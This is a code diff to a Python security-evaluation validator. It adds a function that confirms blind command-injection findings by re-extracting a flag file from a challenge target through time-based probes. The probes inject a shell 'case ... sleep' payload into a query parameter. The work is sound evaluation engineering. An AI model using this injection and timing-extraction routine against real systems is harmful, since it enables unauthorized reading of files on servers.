@@ -31,7 +31,7 @@ import urllib.parse
 import urllib.request
 
 from secqurityVali import constants as C
-from secqurityVali.eval.challenge import CATEGORY_IDOR, Challenge
+from secqurityVali.eval.challenge import CATEGORY_CMDI, CATEGORY_IDOR, Challenge
 from secqurityVali.eval.findings import ReproStep
 from secqurityVali.targets.registry import provisioner_for
 
@@ -153,6 +153,23 @@ def run_replay(
             )
             return extracted == replay_challenge.canary
 
+        if (replay_challenge.category == CATEGORY_CMDI
+                and replay_challenge.variant == "blind"):
+            # Blind command injection withholds all output ({"status":"ok"}), so a
+            # single replayed request can never carry the canary -- exactly like
+            # blind SQLi above. So the validator itself re-extracts the canary via
+            # a time-based oracle on the fresh target and checks it matches. This
+            # is the SAME confirmation blind SQLi already gets; it closes the gap
+            # where blind SQLi could reach the replay/located tiers but blind cmdi
+            # was capped at 0.5 for every miner. No agent code runs -- the
+            # validator drives its own timing probes from the known flag path.
+            flag_path = getattr(prov, "FLAG_PATH", "/flag")
+            extracted = _cmdi_blind_extract(
+                base, replay_challenge.vulnerable_endpoint,
+                replay_challenge.vulnerable_parameter, flag_path,
+            )
+            return bool(extracted) and extracted == replay_challenge.canary
+
         # IDOR: the validator replays with ITS OWN session (Alice's token from the
         # fresh challenge), so the behind-login request reaches the resource. The
         # fresh canary only appears if the broken access control is really there.
@@ -229,6 +246,69 @@ def _boolean_extract(base_url, endpoint, param, table, column, *,
         if ch is None:
             break
         out += ch
+    return out
+
+
+_CMDI_HEX = "0123456789abcdef"
+
+
+def _cmdi_blind_extract(base_url, endpoint, param, flag_path, *,
+                        length=32, sleep_s=0.8, timeout=20.0,
+                        budget_s=150.0) -> str:
+    """Validator-side time-blind extraction of the cmdi canary -- the blind-SQLi
+    re-extraction's twin, for command injection. No agent code runs: the
+    validator itself drives a timing oracle against the fresh target, reading the
+    flag file char by char from the KNOWN flag path (so a genuine blind-injectable
+    endpoint re-derives the fresh canary, while a memorised one cannot).
+
+    Robustness: the validator grades every miner at once, so the box is loaded and
+    a FIXED cutoff would misread. The threshold adapts to the target's measured
+    no-sleep latency, and the sleep is a hard wall-clock floor (a response cannot
+    arrive before it has elapsed) -- so a reading below the line is unambiguously
+    "no sleep", and only a reading just above it (a possible jitter spike on a
+    no-sleep probe) is re-measured and resolved by the MINIMUM, since jitter only
+    ever ADDS time. A per-call wall-clock `budget_s` guards against a pathological
+    box: if it is exceeded the partial result simply won't match, so the score
+    stays at the existing 0.5 (canary-only) tier -- this path can only ever RAISE
+    a blind score to the confirmed/located tier, never lower it."""
+    base_url = base_url.rstrip("/")
+    deadline = time.monotonic() + budget_s
+
+    def timed(value: str) -> float:
+        url = f"{base_url}{endpoint}?" + urllib.parse.urlencode({param: value})
+        t0 = time.monotonic()
+        try:
+            urllib.request.urlopen(url, timeout=timeout).read()
+        except Exception:
+            return 0.0                      # a failed request reads as "no sleep"
+        return time.monotonic() - t0
+
+    # Adaptive baseline: median no-sleep latency under the current load.
+    base = sorted(timed("x") for _ in range(3))[1]
+    slow = base + sleep_s * 0.5
+    band_top = base + sleep_s * 0.8         # above this is a clean full sleep
+
+    def sleeps(cond: str) -> bool:
+        t = timed(cond)
+        if slow <= t < band_top:            # ambiguous: maybe a jitter spike
+            t = min(t, timed(cond))         # jitter only adds -> min reveals truth
+        return t >= slow
+
+    out = ""
+    for i in range(1, length + 1):
+        if time.monotonic() > deadline:
+            return ""                       # give up -> no match -> stays at 0.5
+        lo, hi = 0, len(_CMDI_HEX) - 1
+        while lo < hi:
+            mid = (lo + hi) // 2
+            upper = _CMDI_HEX[mid + 1:hi + 1]       # chars > _CMDI_HEX[mid]
+            cond = (f'x; case "$(cut -c{i}-{i} {flag_path})" in '
+                    f'[{upper}]) sleep {sleep_s};; esac')
+            if sleeps(cond):
+                lo = mid + 1
+            else:
+                hi = mid
+        out += _CMDI_HEX[lo]
     return out
 
 
